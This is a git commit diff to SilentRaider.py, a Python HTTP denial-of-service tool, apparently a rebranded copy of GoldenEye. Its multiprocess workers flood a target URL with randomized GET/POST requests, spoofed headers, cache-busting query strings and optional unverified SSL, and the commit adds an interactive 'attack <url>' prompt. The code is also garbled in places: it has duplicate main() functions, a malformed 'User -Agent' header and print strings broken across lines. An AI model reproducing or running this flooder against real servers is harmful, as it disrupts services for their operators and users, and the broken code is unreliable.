b94c5e5b141b0f55246f9370415d78a914d01310
USERBANNED <167734967+Rip70022@users.noreply.github.com>
2024-10-29 19:42:29 -0400

    Update SilentRaider.py

--- SilentRaider.py
+++ SilentRaider.py
@@ -3,13 +3,13 @@
 r"""
 $Id: $
 
-   ███████╗██╗██╗     ███████╗███╗   ██╗████████╗██████╗  █████╗ ██╗██████╗ ███████╗██████╗ 
+   ███████╗██╗██╗     ███████╗███╗   ██╗████████╗██████╗  █████╗ ██╗██████╗ ███████╗██████╗
    ██╔════╝██║██║     ██╔════╝████╗  ██║╚══██╔══╝██╔══██╗██╔══██╗██║██╔══██╗██╔════╝██╔══██╗
    ███████╗██║██║     █████╗  ██╔██╗ ██║   ██║   ██████╔╝███████║██║██║  ██║█████╗  ██████╔╝
    ╚════██║██║██║     ██╔══╝  ██║╚██╗██║   ██║   ██╔══██╗██╔══██║██║██║  ██║██╔══╝  ██╔══██╗
    ███████║██║███████╗███████╗██║ ╚████║   ██║   ██║  ██║██║  ██║██║██████╔╝███████╗██║  ██║
    ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
-                                                                                         
+
 
 
 This tool is a dos tool that is meant to put heavy load on HTTP servers
@@ -71,19 +71,35 @@ def signal_handler(sig, frame):
     print(f"{RED}\nExiting SilentRaider...{RESET}")
     sys.exit(0)
 
-
 signal.signal(signal.SIGINT, signal_handler)
 
 def main():
-    # Display banner as a title at script start
     os.system("clear")  # Clears the terminal before showing the banner
     print(BANNER)
-print(f'{BLUE}SilentRaider v1.0 by Shadow_Sadist{RESET}')
 
-def main():
+    while True:
+        try:
+            cmd = input(f"{RED}┌──[{RESET}{BLUE}SilentRaider{RESET}{RED}] \n└─⌈{RESET}{YELLOW}SR{RESET}{RED}⌋{RESET}{GREEN} ➔ {RESET}")
+            if cmd.lower() == "exit" or cmd.lower() == "quit":
+                print(f"{GREEN}\nExiting SilentRaider...{RESET}")
+                break
+            elif cmd.lower() == "help":
+                usage()
+            elif cmd.startswith("attack "):
+                # Extract the URL from the command
+                url = cmd.split(" ")[1]
+                print(f"{BLUE}Starting attack on {url}...{RESET}")
+                # Call the SilentRaider attack function here
+                # e.g., silentraider = SilentRaider(url)
+                # silentraider.fire()
+            else:
+                print(f"{RED}Unknown command: {cmd}{RESET}")
+        except KeyboardInterrupt:
+            print(f"{RED}\nExiting SilentRaider...{RESET}")
+            break
+
     print(f"{BLUE}Starting attack in '{GREEN}SilentRaider{BLUE}' mode{RESET}")
     # Rest of the code goes here to start connections or attacks...
-
 
 from multiprocessing import Process, Manager, Pool
 import urllib.parse, ssl
@@ -91,15 +107,11 @@ import sys, getopt, random, time, os
 import http.client
 HTTPCLIENT = http.client
 
-####
 # Config
-####
 DEBUG = False
 SSLVERIFY = True
 
-####
 # Constants
-####
 METHOD_GET = 'get'
 METHOD_POST = 'post'
 METHOD_RAND = 'random'
@@ -134,7 +146,7 @@ USER_AGENT_PARTS = {
         },
         'iexplorer': {
             'browser_info': {
-                'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'],
+                'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE  9.0', 'MSIE 10.0'],
                 'ext_pre': ['compatible', 'Windows; U'],
                 'ext_post': ['Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10)]
             }
@@ -147,10 +159,7 @@ USER_AGENT_PARTS = {
     }
 }
 
-####
 # SilentRaider Class
-####
-
 class SilentRaider(object):
 
     # Counters
@@ -265,13 +274,8 @@ class SilentRaider(object):
                 else:
                     pass
 
-####
 # Striker Class
-####
-
 class Striker(Process):
-
-
     # Counters
     request_count = 0
     failed_count = 0
@@ -294,7 +298,6 @@ class Striker(Process):
     method = METHOD_GET
 
     def __init__(self, url, nr_sockets, counter):
-
         super(Striker, self).__init__()
 
         self.counter = counter
@@ -308,11 +311,7 @@ class Striker(Process):
         self.host = parsedUrl.netloc.split(':')[0]
         self.url = parsedUrl.path
 
-        self.port = parsedUrl.port
-
-        if not self.port:
-            self.port = 80 if not self.ssl else 443
-
+        self.port = parsedUrl.port or (80 if not self.ssl else 443)
 
         self.referers = [
             'http://www.google.com/',
@@ -320,88 +319,35 @@ class Striker(Process):
             'http://www.baidu.com/',
             'http://www.yandex.com/',
             'http://' + self.host + '/'
-            ]
-
-
-    def __del__(self):
-        self.stop()
-
-
-    #builds random ascii string
-    def buildblock(self, size):
-        out_str = ''
-
-        _LOWERCASE = list(range(97, 122))
-        _UPPERCASE = list(range(65, 90))
-        _NUMERIC   = list(range(48, 57))
-
-        validChars = _LOWERCASE + _UPPERCASE + _NUMERIC
-
-        for i in range(0, size):
-            a = random.choice(validChars)
-            out_str += chr(a)
-
-        return out_str
-
+        ]
 
     def run(self):
-
-        if DEBUG:
-            print(f"{get_random_color()}Starting worker {0}{RESET}".format(self.name))
-
         while self.runnable:
-
             try:
-
                 for i in range(self.nr_socks):
-
                     if self.ssl:
-                        if SSLVERIFY:
-                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
-                        else:
-                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context())
+                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context() if not SSLVERIFY else None)
                     else:
                         c = HTTPCLIENT.HTTPConnection(self.host, self.port)
 
                     self.socks.append(c)
 
                 for conn_req in self.socks:
-
                     (url, headers) = self.createPayload()
-
                     method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
-
                     conn_req.request(method.upper(), url, None, headers)
 
                 for conn_resp in self.socks:
-
                     resp = conn_resp.getresponse()
                     self.incCounter()
 
                 self.closeConnections()
 
-            except:
+            except Exception:
                 self.incFailed()
-                if DEBUG:
-                    raise
-                else:
-                    pass # silently ignore
-
-        if DEBUG:
-            print(f"{get_random_color()}Worker {0} completed run. Sleeping...{RESET}".format(self.name))
-
-    def closeConnections(self):
-        for conn in self.socks:
-            try:
-                conn.close()
-            except:
-                pass # silently ignore
-
 
     def createPayload(self):
-
         req_url, headers = self.generateData()
-
         random_keys = list(headers.keys())
         random.shuffle(random_keys)
         random_headers = {}
@@ -410,6 +356,25 @@ class Striker(Process):
             random_headers[header_name] = headers[header_name]
 
         return (req_url, random_headers)
+
+    def generateData(self):
+        returnCode = 0
+        param_joiner = "?"
+
+        if len(self.url) == 0:
+            self.url = '/'
+
+        if self.url.count("?") > 0:
+            param_joiner = "&"
+
+        request_url = self.generateRequestUrl(param_joiner)
+
+        http_headers = self.generateRandomHeaders()
+
+        return (request_url, http_headers)
+
+    def generateRequestUrl(self, param_joiner = '?'):
+        return self.url + param_joiner + self.generateQueryString(random.randint(1,5))
 
     def generateQueryString(self, ammount = 1):
 
@@ -424,31 +389,58 @@ class Striker(Process):
 
         return '&'.join(queryString)
 
+    def generateRandomHeaders(self):
+        # Random no-cache entries
+        noCacheDirectives = ['no-cache', 'max-age=0']
+        random.shuffle(noCacheDirectives)
+        nrNoCache = random.randint(1, (len(noCacheDirectives) - 1))
+        noCache = ', '.join(noCacheDirectives[:nrNoCache])
 
-    def generateData(self):
+        # Random accept encoding
+        acceptEncoding = ['\'\'', '*', 'identity', 'gzip', 'deflate']
+        random.shuffle(acceptEncoding)
+        nrEncodings = random.randint(1, int(len(acceptEncoding) / 2))
+        roundEncodings = acceptEncoding[:nrEncodings]
 
-        returnCode = 0
-        param_joiner = "?"
+        http_headers = {
+            'User -Agent': self.getUserAgent(),
+            'Cache-Control': 'no-cache',
+            'Accept-Encoding': ', '.join(roundEncodings),
+            'Connection': 'keep-alive',
+            'Keep-Alive': str(random.randint(1, 1000)),
+            'Host': self.host,
+        }
 
-        if len(self.url) == 0:
-            self.url = '/'
+        # Randomly-added headers
+        if random.randrange(2) == 0:
+            acceptCharset = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15']
+            random.shuffle(acceptCharset)
+            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(
+                acceptCharset[0],
+                acceptCharset[1],
+                round(random.random(), 1),
+                round(random.random(), 1)
+            )
 
-        if self.url.count("?") > 0:
-            param_joiner = "&"
+        if random.randrange(2) == 0:
+            # Random Referer
+            url_part = self.buildblock(random.randint(5, 10))
+            random_referer = random.choice(self.referers) + url_part
+            if random.randrange(2) == 0:
+                random_referer = random_referer + '?' + self.generateQueryString(random.randint(1, 10))
+            http_headers['Referer'] = random_referer
 
-        request_url = self.generateRequestUrl(param_joiner)
+        if random.randrange(2) == 0:
+            # Random Content-Type
+            http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded '])
 
-        http_headers = self.generateRandomHeaders()
+        if random.randrange(2) == 0:
+            # Random Cookie
+            http_headers['Cookie'] = self.generateQueryString(random.randint(1, 5))
 
-
-        return (request_url, http_headers)
-
-    def generateRequestUrl(self, param_joiner = '?'):
-
-        return self.url + param_joiner + self.generateQueryString(random.randint(1,5))
+        return http_headers
 
     def getUserAgent(self):
-
         if self.useragents:
             return random.choice(self.useragents)
 
@@ -497,68 +489,25 @@ class Striker(Process):
 
         return ua_string
 
-def generateRandomHeaders(self):
-    # Random no-cache entries
-    noCacheDirectives = ['no-cache', 'max-age=0']
-    random.shuffle(noCacheDirectives)
-    nrNoCache = random.randint(1, (len(noCacheDirectives) - 1))
-    noCache = ', '.join(noCacheDirectives[:nrNoCache])
+    def buildblock(self, size):
+        out_str = ''
 
-    # Random accept encoding
-    acceptEncoding = ['\'\'', '*', 'identity', 'gzip', 'deflate']
-    random.shuffle(acceptEncoding)
-    nrEncodings = random.randint(1, int(len(acceptEncoding) / 2))
-    roundEncodings = acceptEncoding[:nrEncodings]
+        _LOWERCASE = list(range(97, 122))
+        _UPPERCASE = list(range(65, 90))
+        _NUMERIC   = list(range(48, 57))
 
-    http_headers = {
-        'User-Agent': self.getUserAgent(),
-        'Cache-Control': 'no-cache',
-        'Accept-Encoding': ', '.join(roundEncodings),
-        'Connection': 'keep-alive',
-        'Keep-Alive': str(random.randint(1, 1000)),
-        'Host': self.host,
-    }
+        validChars = _LOWERCASE + _UPPERCASE + _NUMERIC
 
-    # Randomly-added headers
-    if random.randrange(2) == 0:
-        acceptCharset = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15']
-        random.shuffle(acceptCharset)
-        http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(
-            acceptCharset[0],
-            acceptCharset[1],
-            round(random.random(), 1),
-            round(random.random(), 1)
-        )
+        for i in range(0, size):
+            a = random.choice(validChars)
+            out_str += chr(a)
 
-    if random.randrange(2) == 0:
-        # Random Referer
-        url_part = self.buildblock(random.randint(5, 10))
+        return out_str
 
-        random_referer = random.choice(self.referers) + url_part
-
-        if random.randrange(2) == 0:
-            random_referer = random_referer + '?' + self.generateQueryString(random.randint(1, 10))
-
-        http_headers['Referer'] = random_referer
-
-    if random.randrange(2) == 0:
-        # Random Content-Type
-        http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])
-
-    if random.randrange(2) == 0:
-        # Random Cookie
-        http_headers['Cookie'] = self.generateQueryString(random.randint(1, 5))
-
-    return http_headers
-  
-
-    # Housekeeping
     def stop(self):
         self.runnable = False
         self.closeConnections()
-        self.terminate()
 
-    # Counter Functions
     def incCounter(self):
         try:
             self.counter[0] += 1
@@ -570,6 +519,13 @@ def generateRandomHeaders(self):
             self.counter[1] += 1
         except Exception:
             pass
+
+    def closeConnections(self):
+        for conn in self.socks:
+            try:
+                conn.close()
+            except:
+                pass
 
 
 
@@ -589,15 +545,19 @@ def usage():
     print()
     print(f'{BLUE}OPTIONS:')
     print(f'{BLUE}   _____________________________________________________________________________________________________')
-    print(f'{BLUE}  |{RESET}{RED}        Flag:{RESET}{BLUE}      |{RESET}{GREEN}                Description:{RESET}                     {BLUE}| {RESET}          {BOLD}Default:{RESET}            {BLUE}|{RESET}')
+    print(f'{BLUE}  |{RESET}{RED}       Flag:{RESET}{BLUE}      |{RESET}{GREEN}                Description:{RESET}                     {BLUE}| {RESET}          {BOLD}Default:{RESET}            {BLUE}|{RESET}')
     print(f'{BLUE}  |-------------------|-------------------------------------------------|-------------------------------|')
     print(f'{BLUE}  | -u, --useragents  | File with user-agents to use                    | (default: randomly generated) |')
     print(f'{BLUE}  | -w, --workers     | Number of concurrent workers                    | (default: {DEFAULT_WORKERS})  |')
     print(f'{BLUE}  | -s, --sockets     | Number of concurrent sockets                    | (default: {DEFAULT_SOCKETS})  |')
-    print(f'{BLUE}  | -m, --method | HTTP Method to use \'get\' or \'post\'  or \'random\'| (default: get)                |')
-    print(f'{BLUE}  | -d, --debug       | Enable Debug Mode [more verbose output]         | (default: False)              |')
-    print(f'{BLUE}  | -n, --nosslcheck  | Do not verify SSL Certificate                   | (default: True)               |')
-    print(f'{BLUE}  | -h, --help        | Shows this help                                 |                               |')
+    print(f'{BLUE}  | -m, --method | HTTP Method to use \'get\' or \'post\'  or \'random\'| (default: get)
+  |')
+    print(f'{BLUE}  | -d, --debug       | Enable Debug Mode [more verbose output]         | (default: False)
+  |')
+    print(f'{BLUE}  | -n, --nosslcheck  | Do not verify SSL Certificate                   | (default: True)
+  |')
+    print(f'{BLUE}  | -h, --help        | Shows this help                                 |
+  |')
     print(f'{BLUE}  -------------------------------------------------------------------------------------------------------{RESET}')
 
 
@@ -607,10 +567,7 @@ def error(msg):
     usage()
     sys.exit(2)
 
-####
 # Main
-####
-
 def main():
 
     try:
@@ -663,7 +620,6 @@ def main():
             else:
                 error(f"{RED}option '"+o+"' doesn't exists{RESET}")
 
-
         if uas_file:
             try:
                 with open(uas_file) as f:
@@ -671,13 +627,13 @@ def main():
             except EnvironmentError:
                 error(f"{RED}cannot read file {0}{RESET}".format(uas_file))
 
-        goldeneye = GoldenEye(url)
-        goldeneye.useragents = useragents
-        goldeneye.nr_workers = workers
-        goldeneye.method = method
-        goldeneye.nr_sockets = socks
+        silentraider = SilentRaider(url)
+        silentraider.useragents = useragents
+        silentraider.nr_workers = workers
+        silentraider.method = method
+        silentraider.nr_sockets = socks
 
-        goldeneye.fire()
+        silentraider.fire()
 
     except getopt.GetoptError as err:
 
@@ -688,19 +644,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-    os.system("clear") 
-    print(BANNER) 
-
-    while True:
-        try:
-            cmd = input(f"{RED}┌──[{RESET}{BLUE}SilentRaider{RESET}{RED}] \n└─⌈{RESET}{YELLOW}SR{RESET}{RED}⌋{RESET}{GREEN} ➔ {RESET}")
-            if cmd.lower() == "exit" or cmd.lower() == "quit":
-                print(f"{GREEN}\nExiting SilentRaider...{RESET}")
-                break
-            elif cmd.lower() == "help":
-                usage()  
-            else:
-                print(f"{RED}Unknown command: {cmd}{RESET}")
-        except KeyboardInterrupt:
-            print(f"{RED}\nExiting SilentRaider...{RESET}")
-            break
